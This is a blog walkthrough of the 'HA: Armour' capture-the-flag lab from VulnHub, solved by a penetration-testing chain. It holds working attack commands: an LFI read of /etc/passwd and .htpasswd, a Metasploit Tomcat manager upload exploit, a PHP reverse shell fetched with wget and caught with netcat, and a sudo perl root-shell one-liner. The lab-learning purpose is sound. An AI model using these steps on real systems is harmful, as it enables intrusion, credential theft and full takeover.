---
title: 'HA: Armour Walkthrough'
date: 2019-10-06T07:07:00+01:00
draft: false
---

This is our Walkthrough for “HA: Armour” and this CTF is designed by Hacking Articles Team ![😊](https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60a.png), hope you will enjoy this.

**TASK:** Klaw has stolen some armours from the Avengers Super-Secret Base. Falcon has checked the manifest, the following things are unaccountable:

*   HulkBuster Armour
*   Spiderman Armour
*   Ant-Man Armour
*   Black Panther Armour
*   Iron Man Armour

Klaw hides all these armours and now it’s up to you. Can you use your penetration skills to recover them all?

**Hint:** _P.S. Klaw has a habit of dividing his passwords into 3 parts and save them at different locations. So, if you get some combine them to move forward._

**Level:** Intermediate

You can download this lab from **[here](https://www.vulnhub.com/entry/ha-armour,370/)**.

**Let’s Begin!!**

**Penetration Testing Methodologies**

**Scanning Network**

*   Netdiscover
*   Nmap

**Enumeration**

*   SSH
*   Abusing HTTP
*   Tftp
*   Dirb
*   LFI

**Exploiting**

*   Abusing Tomcat Manager (Metasploit)
*   Internal Recon

**Privilege Escalation**

*   Abusingconf
*   Abusing sudo rights

### **Scanning Network**

Firsts of all try to identify our target and for this use the following command:

```
netdiscover
```

![](https://i0.wp.com/1.bp.blogspot.com/-ParoDTyR6l8/XZl7fQF-9FI/AAAAAAAAgzE/ceuG1jp-QKIDpMrhQ-X3m4nWNHNxEhgJQCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

After you have identified your target using the above command you can start with our second step by scanning the target. You can use nmap to scan the target using the following command:

```
nmap -p- -A 192.168.1.101
```

![](https://i0.wp.com/1.bp.blogspot.com/-QGNXDfjsepA/XZl7ie9Sl8I/AAAAAAAAgzw/Cxgf4cX2xBcJiHL71LaY5CaZ7oY7hyxygCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

### **Enumeration**

With the help of scanning, you can find that port numbers 80, 8009, 8080 for HTTP (apache http, apache Jserv & apache tomcat) & 65534 for SSH are opened.

You will find the first “HulkBuster” armour when connecting to SSH via port 65534 and the first hint: the Olympics as mentioned above for Klaw.

```
ssh 192.168.1.101 -p65534
```

![](https://i2.wp.com/1.bp.blogspot.com/-T8qPW7yJ74o/XZl7jxbWfmI/AAAAAAAAg0I/3xlIcTKhBUME14wkw6vrgXjC79KSRZ2pQCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

After getting HulkBuster, it was time to dig out another Armor so you can connect to port 80 through a web browser.

Hmmmm! Well, the web page described the Armor Collection of Marvel’s famous characters; but you need to dig out more so that you can get a hint.

![](https://i0.wp.com/1.bp.blogspot.com/-HJQBS0FdmUc/XZl7k6RnhwI/AAAAAAAAg0U/0BMzrcfUCf43COHx2JrO6GEo-Dj2AM1MgCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

Ahh!! So, as you can see from the image given below that from inside the source code we found 3 things i.e. “armour, 69 and notes.txt” from inside the comment.

Let’s check each hint one-by-one and identify what it says.

![](https://i0.wp.com/1.bp.blogspot.com/-624nZDkAKFY/XZl7kvCv6PI/AAAAAAAAg0M/slOmEd3tHGMHHLFCzRoPAbfEvh_BipJaQCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

Assuming 69 could be a hint for any port, therefore using nmap again to decide whether or not a service is running on port 69. Therefore, we scan for the UDP protocol and give the following command:

```
nmap -sU -p69 192.168.1.101
```

![](https://i2.wp.com/1.bp.blogspot.com/-AUhPPmGIbyk/XZl7k0h1fdI/AAAAAAAAg0Q/Q7cbzFrIYkgOpn89TMi0tU8oH3Azo29gQCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

Now, once you know that port 69 is open for TFTP operation, you can try connecting to TFTP and check the list of available files and directories.

Here you find the notes.txt file, which was mentioned above, so you need to download this file to your local machine.

```
tftp 192.168.1.101  
get notes.txt
```

![](https://i2.wp.com/1.bp.blogspot.com/-AKZwF9fBa6w/XZl7lT6sJeI/AAAAAAAAg0Y/3OnPrcxj66Md9CnexbTHFkkbSWum3inpgCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

From inside notes.txt file, you will get the second amour which is for “Spiderman” and 2nd Hint:**maybeevena** which was hidden by Klaw.

![](https://i1.wp.com/1.bp.blogspot.com/-zwUnDQmBHA0/XZl7mBrSqwI/AAAAAAAAg0c/MWFnALR6SJ8vzoxUzUz-3NOCZiPXkcjIwCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

At present, you must be having two amours and two hints that we have found till now. To identify third amour or hint we are going to use dirb for brute-forcing web directory to enumerate all files with .php extension.

```
dirb http://192.168.1.101 -X .php
```

With the of dirb, you may find a URL for _/file.php_ page as shown in the below image.

```
http://192.168.1.101/file.php
```

![](https://i2.wp.com/1.bp.blogspot.com/-OPbgeHD0m54/XZl7mgfRAPI/AAAAAAAAg0g/FF3KDhqjrUkbX8GihCA9RisQWvfCEiBhACLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

But when you browse the /file.php page, you’ll see a white colour page that’s left blank, and it’s seriously questioning why the author has left file.php blank.

And if you are aware of the Vulnerabilities web application and its Penetration Testing, then you would have known what kind of misconfiguration it is.

![](https://i2.wp.com/1.bp.blogspot.com/-mJ0Jg9_JMNc/XZl7fuVzVwI/AAAAAAAAgzI/vPKcyzOBBd0ADi__HwZyROqFZgJqe7yeACLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

In such a case, it is likely that the host system or application is vulnerable to LFI (Local File Inclusion).

So, without wasting your time, you can try to access /etc/passwd like we did here and say it’s vulnerable to LFI.

![](https://i0.wp.com/1.bp.blogspot.com/-sFbKhbc6LX4/XZl7fv36B2I/AAAAAAAAgzM/RwIa6ceqyQIGO7fUL0Q78BqB4NeBT__6gCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

When you dig more and more than inside /etc/apache2/.htpasswd file you will find the third amour which for “Ant-Man” and along with this 3rd hint: **StarBucks**.

Now let’s recall the hint given by the author:

_P.S. Klaw has a habit of dividing his passwords into **3 parts** and save them at different locations. So, **if you get some combine them to move forward.**_

So, as you know that till now, we have found all 3 parts of the password as Hint1, Hint2 and Hint3; let’s combined them and identify how it will help to move ahead.

```
http://192.168.1.101/file.php?file=/etc/apache2/.htpasswd
```

![](https://i2.wp.com/1.bp.blogspot.com/-s_DPWzY2YQw/XZl7gcyMk3I/AAAAAAAAgzQ/5UEwcTqh6NQXpSFPQwyI8GOtHK4TAB14ACLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

After combining Hint1, Hint2 and Hint3 you will have a password:

**TheOlympicsmaybeevenastarBucks**

As you know port 8080 is available for Apache tomcat manager and maybe can login into tomcat server with the help of this password.

![](https://i2.wp.com/1.bp.blogspot.com/-lAPLnc1vOD8/XZl7ghD_geI/AAAAAAAAgzU/Kym-qdwMejQzkek1J7yNJ2wWN7EfwiJTACLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

### **Exploiting Tomcat Manager**

For login into tomcat manager we use the following credential:

**Username:** Amour (found above from inside source code)

**Password:** TheOlympicsmaybeevenastarBucks

![](https://i0.wp.com/1.bp.blogspot.com/-qJmSVEJQVKI/XZl7g2OLGTI/AAAAAAAAgzY/udO1Pq9WIwE19XOshO6vZk79ZsHZHatrgCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

I hope you all are aware of Tomcat manager exploit available in Metasploit framework, if not then read the complete article from [here](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/).

So, without wasting time we are straight away logged into Tomcat Server using Metasploit Tomcat Manager using the above credentials for Tomcat Server Login.

```
use exploit/multi/http/tomcat\_mgr\_upload  
set rhosts 192.168.1.101  
set rport 8080  
set httpusername armour  
set httppassword TheOlympicsmaybeevenastarBucks  
exploit
```

Booom!! Our favourite meterpreter session is all here, let’s go for Post enumeration.

```
netstat -antp
```

If you check your local network static for TCP and UDP connections, you’ll see that there’s something running 8081, and even nmap doesn’t display anything for this. With the aid of the meterpreter, we have forwarded service port 8081 to our local host:8081.

```
portfwd add -l 8081 -p 8081 -r 127.0.0.1
```

![](https://i1.wp.com/1.bp.blogspot.com/-X_2-ld75QPY/XZl7hFc-HaI/AAAAAAAAgzc/SR1XaIaD1skWaOv1NJJeVWn13LQXkxg0wCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

Once you have to forward the service over your local machine then you can explore it the web browser as we have done here.

```
http://127.0.0.1:8081
```

This will give you the fourth amour for “Black-Panther” ![😎](https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60e.png) 

![](https://i2.wp.com/1.bp.blogspot.com/-tXXDMad7MuU/XZl7hdqKmSI/AAAAAAAAgzg/Lh9bwyVUVeII7WNdNwofxOVqiAvisth-ACLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

### **Privilege Escalation**

This lab is like a Rabbit hole where Enumeration is key for identifying loopholes or further hint. Similarly, we enumerate that /apache2.conf and /html owns writable permission.

![](https://i2.wp.com/1.bp.blogspot.com/-z34MCN58juc/XZl7hq9BviI/AAAAAAAAgzk/1iw9WMY-WVYlmFQR_SOzw8PMu2IamSSYQCLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

Since we know apache2.conf has all permission, therefore, we’ll try to edit this file for the escalating privilege of another user.

![](https://i2.wp.com/1.bp.blogspot.com/-lWYvrShHRHI/XZl7h9U3rMI/AAAAAAAAgzo/Cpm8GtBzUw4RjgBgzkd_TGcBT4O0FegJwCLcBGAsYHQ/s1600/18.png?w=687&ssl=1)

This machine has a user profile named as “aarti” that we had enumerated through /etc/passwd and now try to add a **user:aarti** and **group:aarti** inside the /etc/apache2/apache2.conf so that we will leverage it for privilege escalation. So, the idea is when we restart the apache service it will get executed with aarti user privileges.

So, we have simple copied the entire content of the apache2.conf file in our local machine and made changes as said above.

![](https://i2.wp.com/1.bp.blogspot.com/-Z-AldzrMDF8/XZl7iH1dSiI/AAAAAAAAgzs/6n43fG-Wn3Ylx1_BX28wzibhV1Pj1WgwQCLcBGAsYHQ/s1600/19.png?w=687&ssl=1)

Then download the modified apache2.conf from your local machine into the host machine and replaced the original apache2.conf file as we have done here.

![](https://i0.wp.com/1.bp.blogspot.com/-5Yq8YD-GN-w/XZl7ijiISwI/AAAAAAAAgz0/I9eA4mFnodUJvHUZBJpuavrSg4hv5sCfACLcBGAsYHQ/s1600/20.png?w=687&ssl=1)

As you know the /html has full permission which means inject the php backdoor in this web directory.  Parallelly we grabbed a php-reverse-shell from /usr/share/webshells/php and modified the listener IP as ours and named it as shell.php.

![](https://i1.wp.com/1.bp.blogspot.com/-6rpZVP5bcZU/XZl7i-IHFNI/AAAAAAAAgz4/Kd4nielmdysb5_K0lr7Y3PXj_6P0WMnwQCLcBGAsYHQ/s1600/21.png?w=687&ssl=1)

Then downloaded the shell into /var/www/html folder so that we can access it through the browser.

To make the apache service run as aarti user we have to restart the apache service, thus reboot the machine.

```
cd /var/www/html  
wget http://192.168.1.102:8000/shell.php
```

![](https://i2.wp.com/1.bp.blogspot.com/-X9TiAkpCFqg/XZl7jRm8WRI/AAAAAAAAgz8/9h9ZNe4sD9EmHAIYKhOXiZWwwfR7_IylgCLcBGAsYHQ/s1600/22.png?w=687&ssl=1)

After reboot is complete, we just executed the shell.php script in the browser and at the same time started a netcat listener on your kali.

```
nc -lvp 1234  
http://192.168.1.101/shell.php
```

![](https://i0.wp.com/1.bp.blogspot.com/-VXf7k6DQ7qg/XZl7jqsa-UI/AAAAAAAAg0E/LowBiUNzp44aOTt1ASqv8XffV1x7tIvAACLcBGAsYHQ/s1600/23.png?w=687&ssl=1)

After some time, we got a reverse netcat shell on our local machine for user aarti. Now let’s check sudo rights for this user.

```
sudo -l
```

Here you can observe that it shows that user aarti has sudo right to run Perl application as root which means we can try to abuse its sudo for escalating root privilege.

```
sudo perl -e 'exec "/bin/bash";'
```

Boom!! We have the root shell access, let’s find the fifth and final amour. You can find it inside the /root directory within final.txt.

```
cd /root  
cat final.txt
```

And the final amour is my favourite “Iron-man” ![🤗](https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f917.png) 

![](https://i2.wp.com/1.bp.blogspot.com/-GLN_T88uqbQ/XZl7jmlVSCI/AAAAAAAAg0A/2cfcNJBQy8IiAaZwmDt4ccNg2j74WhzdwCLcBGAsYHQ/s1600/24.png?w=687&ssl=1)

**Author**: Mohd Ahmed is a Cybersecurity enthusiast and Researcher in the field of WebApp Penetration testing. Contact [**here**](https://www.linkedin.com/in/mohd-ahmed-bb900616b/)

The post [HA: Armour Walkthrough](https://www.hackingarticles.in/ha-armour-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/359N4OJ